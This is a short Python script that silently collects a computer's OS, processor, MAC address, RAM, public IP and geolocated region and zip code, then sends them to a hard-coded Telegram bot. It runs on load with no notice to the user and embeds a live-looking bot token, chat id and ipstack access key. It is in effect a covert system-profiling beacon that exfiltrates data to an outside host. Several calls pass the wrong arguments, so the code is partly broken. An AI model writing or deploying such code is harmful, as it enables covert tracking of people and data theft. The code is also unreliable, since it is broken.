import platform
import requests
import re
import psutil
import uuid
import pickle
i=0
chat_id='1709337743'
userest=[]

def getSystemInfo_2(ip_info,ip,add):# get info for system user
    info={}
    info['Platform']= platform.system()+' '+platform.release()
    info['Architecture']=platform.machine()
    info['Processor']=platform.processor()
    info['Mac addres']=f"{':'.join(re.findall('..', '%012x' % uuid.getnode()))}"
    info['RAM']= f'{str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"}'
    info['Host IP Addres']= ip
    info['Region Name']=f"{ip_info['region_name']}"
    info['Zip']= f"{ip_info['zip']}{ip_info['location']['country_flag_emoji']}"
    if add==True:    
        userest.append(info)
    return userest


def send(chat_id,ip_info,status,message):
    try:
        if status == 'online':
            requests.get(f"https://api.telegram.org/bot1715016002:AAE79lpyz63sm9SvNX4ddRP51j6Qs82AJPk/sendMessage?chat_id={chat_id}&text={message}")
        info_users=get_users(ip_info)
        data=''
        for info_user in info_users:
            for info in info_user:
                data_info=f"{info}={info_user[info]}"
                data=data+data_info+'\n'
        
        requests.get(f"https://api.telegram.org/bot1715016002:AAE79lpyz63sm9SvNX4ddRP51j6Qs82AJPk/sendMessage?chat_id={chat_id}&text={data}")
    except Exception as e:
        requests.get(f"https://api.telegram.org/bot1715016002:AAE79lpyz63sm9SvNX4ddRP51j6Qs82AJPk/sendMessage?chat_id={chat_id}&text={e}")

def dump_users(ip_info,ip):
    f=open('users_db.txt','wb')
    pickle.dump(getSystemInfo_2(ip_info,ip,add=True),f,protocol=0)
    f.close()

def get_users(ip_info):
    f=open('users_db.txt','rb')
    users=pickle.load(f)
    f.close()
    return users

def main(status):
    ip_url=requests.get("https://jsonip.com/").json()
    ip=ip_url['ip']
    ip_info=requests.get(f"http://api.ipstack.com/{ip}?access_key=c1919a45e5b156537d3f4e8d726b4fb7&format=1").json()
    try:
        for user_db in get_users(ip_info):
            for user in getSystemInfo_2(ip_info,ip,add=True):
                if user_db['Host IP Addres'] == user['Host IP Addres']:
                    old_ip=user_db['Host IP Addres']
                    print(f"user_db={old_ip}")
                elif user_db['Host IP Addres'] != user['Host IP Addres']:
                    send(chat_id,ip,ip_info)
                    dump_users(ip_info)
    except FileNotFoundError:
        dump_users(ip_info,ip)
    except Exception as e:
        requests.get(f"https://api.telegram.org/bot1715016002:AAE79lpyz63sm9SvNX4ddRP51j6Qs82AJPk/sendMessage?chat_id={chat_id}&text={e}")
main(status=True)